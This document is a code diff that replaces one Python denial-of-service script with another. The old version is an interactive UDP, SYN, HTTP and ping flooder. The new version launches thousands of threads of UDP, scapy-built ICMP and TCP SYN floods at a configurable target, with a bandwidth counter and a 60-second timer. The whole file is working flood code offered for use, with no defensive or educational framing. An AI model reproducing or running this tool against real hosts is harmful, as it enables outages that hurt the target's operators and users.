@@ -1,107 +1,107 @@
-#!/usr/bin/python3
-
 import socket
+import random
 import threading
 import time
-import logging
-import random
+import os
+from scapy.all import IP, ICMP, TCP, send
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+TARGET_IP = "IP & Domain"
+# Phần này là tự cus ko dc cus phần PACKET_SIZE
+TARGET_UDP_PORT = 7777
+TARGET_TCP_PORT = 80
+PACKET_SIZE = 65507
+THREADS_UDP = 1000
+THREADS_ICMP = 500
+THREADS_TCP = 1000
+DURATION = 60
 
-def udp_flood(ip, port, stop_event):
-    try:
-        logging.info(f"Start UDP flooding {ip}:{port}")
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while not stop_event.is_set():
+total_bytes_sent = 0
+total_bytes_received = 0
+lock = threading.Lock()
+
+def update_bandwidth(sent, received):
+    global total_bytes_sent, total_bytes_received
+    with lock:
+        total_bytes_sent += sent
+        total_bytes_received += received
+
+def udp_flood():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+        packet = os.urandom(PACKET_SIZE)
+        while True:
             try:
-                sock.sendto(b"X" * 65507, (ip, port))
-                logging.info(f"Sent UDP packet to {ip}:{port}")
-                time.sleep(0.001)
+                sent = s.sendto(packet, (TARGET_IP, TARGET_UDP_PORT))
+                update_bandwidth(sent, 0)
             except Exception as e:
-                logging.error(f"Error during UDP packet sending: {str(e)}")
-    except Exception as e:
-        logging.error(f"Error during UDP attack: {str(e)}")
-    finally:
-        sock.close()
+                print(f"UDP Error: {e}")
 
-def syn_flood(ip, port, stop_event):
-    try:
-        logging.info(f"Start SYN flooding {ip}:{port}")
-        while not stop_event.is_set():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.connect_ex((ip, port))  
-                logging.info(f"Sent SYN packet to {ip}:{port}")
-                time.sleep(0.01)
-            except Exception as e:
-                logging.error(f"Error during SYN packet sending: {str(e)}")
-    except Exception as e:
-        logging.error(f"Error during SYN attack: {str(e)}")
-
-def http_flood(ip, port, stop_event):
-    try:
-        logging.info(f"Start HTTP flooding {ip}:{port}")
-        while not stop_event.is_set():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((ip, port))
-                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
-                sock.sendall(request.encode())
-                logging.info(f"Sent HTTP request to {ip}:{port}")
-                sock.close()
-                time.sleep(0.01)
-            except Exception as e:
-                logging.error(f"Error during HTTP request sending: {str(e)}")
-    except Exception as e:
-        logging.error(f"Error during HTTP attack: {str(e)}")
-
-def ping_flood(ip, stop_event):
-    try:
-        logging.info(f"Start Ping flooding {ip}")
-        while not stop_event.is_set():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                sock.sendto(b'\x08\x00\x00\x00\x00\x00\x00\x00', (ip, 0))  
-                logging.info(f"Sent Ping to {ip}")
-                time.sleep(0.01)
-            except Exception as e:
-                logging.error(f"Error during Ping sending: {str(e)}")
-    except Exception as e:
-        logging.error(f"Error during Ping attack: {str(e)}")
-
-if __name__ == "__main__":
-    ip = input("Enter Target IP: ")
-    port = int(input("Enter Port [1-65535]: "))
-    attack_type = input("Enter attack type (udp/syn/http/ping): ").strip().lower()
-    thread_count = int(input("Enter number of Threads: "))
+def icmp_flood():
+    packet = IP(dst=TARGET_IP)/ICMP()/"FloodTest"
     while True:
         try:
-            if 1 <= port <= 65535 and thread_count > 0:
-                break
-            else:
-                print("Port number must be between 1 and 65535 and number of threads must be greater than 0.")
-        except ValueError:
-            print("Invalid input. Please enter valid numbers.")
-    stop_event = threading.Event()
-    threads = []
-    attack_functions = {
-        'udp': udp_flood,
-        'syn': syn_flood,
-        'http': http_flood,
-        'ping': ping_flood
-    }
-    if attack_type not in attack_functions:
-        print("Invalid attack type. Choose from 'udp', 'syn', 'http', 'ping'.")
-    else:
-        for _ in range(thread_count):
-            thread = threading.Thread(target=attack_functions[attack_type], args=(ip, port, stop_event))
-            thread.start()
-            threads.append(thread)     
+            send(packet, verbose=0)
+            update_bandwidth(len(packet), 0)
+        except Exception as e:
+            print(f"ICMP Error: {e}")
+
+def tcp_flood():
+    while True:
         try:
-            input("Press Enter to stop the attack...")
-        finally:
-            stop_event.set()
-        for thread in threads:
-            thread.join()
-        logging.info("Attack completed.")
+            ip = IP(dst=TARGET_IP)
+            syn = TCP(dport=TARGET_TCP_PORT, flags="S", seq=random.randint(1, 65535))
+            send(ip/syn, verbose=0)
+            update_bandwidth(len(ip/syn), 0)
+        except Exception as e:
+            print(f"TCP Error: {e}")
+
+def display_bandwidth():
+    global total_bytes_sent, total_bytes_received
+    while True:
+        with lock:
+            sent_mb = total_bytes_sent / (1024 * 1024)
+            received_mb = total_bytes_received / (1024 * 1024)
+        print(f"Total Sent: {sent_mb:.2f} MB | Total Received: {received_mb:.2f} MB")
+        time.sleep(1)
+
+def perform_attack():
+    print(f"Starting combined UDP, ICMP, and TCP flood on {TARGET_IP}...")
+    threads = []
+
+    for _ in range(THREADS_UDP):
+        thread = threading.Thread(target=udp_flood)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+
+    for _ in range(THREADS_ICMP):
+        thread = threading.Thread(target=icmp_flood)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+
+    for _ in range(THREADS_TCP):
+        thread = threading.Thread(target=tcp_flood)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+
+    display_thread = threading.Thread(target=display_bandwidth)
+    display_thread.daemon = True
+    display_thread.start()
+
+    try:
+        for remaining in range(DURATION, 0, -1):
+            print(f"Flooding... {remaining} seconds remaining")
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nAttack stopped by user.")
+
+    print("\nAttack finished.")
+    with lock:
+        sent_mb = total_bytes_sent / (1024 * 1024)
+        received_mb = total_bytes_received / (1024 * 1024)
+    print(f"Total Sent: {sent_mb:.2f} MB")
+    print(f"Total Received: {received_mb:.2f} MB")
+
+if __name__ == "__main__":
+    perform_attack()
